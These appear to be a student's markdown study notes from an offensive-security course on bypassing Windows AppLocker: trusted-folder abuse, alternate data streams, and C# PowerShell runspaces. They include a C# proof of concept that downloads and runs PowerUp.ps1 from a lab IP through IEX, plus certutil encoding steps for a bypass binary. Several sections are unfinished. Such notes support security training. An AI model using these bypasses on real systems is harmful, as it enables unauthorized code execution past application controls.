Enumerate AppLocker via powershell after access
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```


## Applocker

### basic bypasses:
1) [Trusted Folders](#trusted-folders)
2) [Bypass with DLLs](#bypass-with-dlls)
3) [Alternate Data Streams](#alternate-data-streams)
4) [Third Party Executables](#third-party)
   <br>

### Bypassing AppLocker with PowerShell
5) [Check Constrained Language mode](#ps-mode)
6) [Custom Runspaces (Powershell in C#)](#ps-in-csharp)
7) [Bypassing applocker with C#](#worflow-bypass) (System.Workflow.ComponentModel.dll assembly)
8) 
<br><br>


#### Brief backbround 


<img width="843" height="715" alt="image" src="https://github.com/user-attachments/assets/2e218654-251b-40ac-8ec6-3b9401c5b371" />


<br><br>
# Basic Bypasses


## Trusted Folders
<a name="trusted-folders"></a>

**The default rules for AppLocker whitelist all executables and scripts located in C:\Program Files, C:\Program Files (x86), and C:\Windows. **

1) Use Accesschk from SysInternals to look for writable folders.  

AccessChk -w to locate writable directories, -u to suppress any errors and -s to recurse through all subdirectories  

Ex: accesschk.exe "student" C:\Windows -wus

2) Use icalcs.exe to see if you can execute on that folder.  

Ex: icacls.exe C:\Windows\Tasks


<img width="847" height="273" alt="image" src="https://github.com/user-attachments/assets/e55741da-1d8b-46c5-8815-11838c26c5d4" />

3) Clearly move stuff to this folder to execute it.

<br><br>

## Bypass with DLL's
<a name="bypass-with-dlls"></a>

**The default ruleset doesn't protect against loading arbitrary DLLs.**

<img width="807" height="346" alt="image" src="https://github.com/user-attachments/assets/192ef529-54b1-4d0b-9cbe-35fe78e9809b" />
<br><br>

**When enabled though, default rules allow execution in C:\Windows\* AND C:\Program Files** this does not include C:\program files(x86)

<br><br>

## 12.2.3. Alternate Data Streams  
<a name="alternate-data-streams"></a>  

#### POC running .js file via wscript via ADS

**POC SCRIPT saved as test.js**
``` Javascript
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("cmd.exe");
```
<br><br>
<img width="785" height="250" alt="image" src="https://github.com/user-attachments/assets/a0c5021f-a6d8-478b-aeb4-978db4d802b9" />
<br><br>


To view AD streams, use /r for recursive: **dir /r "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log"**
<br><br>

To execute ADS: **wscript "C:\program files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.ks"**
<br><br>

<img width="866" height="253" alt="image" src="https://github.com/user-attachments/assets/1a06ac38-21e3-4828-92d4-a1cca632c340" />


## 12.2.4 Third Party Execution
<a name="third-party"></a>

**Third party frameworks like Python,Perl, Java and Microsoft Office VBA are NOT blocked by AppLocker**
<br><br><br>

## Powershell Execution policy
<a name="ps-mode"></a>
Three levels of protection via Constrained Language policy  

The first (and default) level, **FullLanguage**, allows all cmdlets and the entire .NET framework as well as C# code execution. By contrast, **NoLanguage** disallows all script text. **RestrictedLanguage** offers a compromise, allowing default cmdlets but heavily restricting much else.

``` powershell
$ExecutionContext.SessionState.LanguageMode
```
<br>

To see if you are in FullLanguage you can use the math C# function:
``` powershell
[Math]::Cos(1)
```
<br><br>

## Custom Runspaces
<a name="ps-in-csharp"></a>

***YOU NEED System.Management.Automation.dll for this attack***  
<br><br>

***What worked on personal PC for POST .net 4.0***

Install dependecies by opening terminal and then navigating to project folder and running

``` cmd
dotnet add package Microsoft.PowerShell.SDK --version 7.4.0
```

Visual Studio Using statements:  
```
using System.Management.Automation;
using System.Management.Automation.Runspaces;
```
<br><br>

***PRE .NET 5.0***
Locate System.Management.Automation.dll via Powershell  
```powershell
 Get-ChildItem -File System.Management.Automation.dll -Recurse -Path C:\ -ErrorAction Ignore
```

Personal PC this located multiple areas.  This didnt work for me using .NET 8.0:
1) C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\ **DLL**
2) C:\Program Files (x86)\Reference Assemblies\Microsoft\WindowsPowerShell\3.0\ **DLL**
<br><br><br>


#### POC script to download PowerUp.ps1 and execute all checks:
``` CSharp
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace BypassApplockerWithCsharpandPowershell
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Tools\\test.txt";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();

        }
    }
}
```

## Powershell CLM bypass (installutil /uninstall)
<a name="clm-bypass"></a>

# too tired to finish this section tonight.  Unable to get my .net project to find System.Management for the powershell runtime namesapce


Base 64 encode file

```powershell
certutil -encode C:\Users\Offsec\source\repos\Bypass\Bypass\bin\x64\Release\Bypass.exe file.txt
```

Base 64 decode file

```powershell
certutil -decode enc.txt Bypass.exe
```

## Bypassing Applocker with c# (System.Workflow.ComponentModel.dll assembly)
<a name="workflow-bypass"></a>

**application must load unsigned managed code into memory. This is typically done through APIs like Load, LoadFile or LoadFrom.**

1) Load suspected library into DNSPY to reverse engineer the managed C# code.
2) 
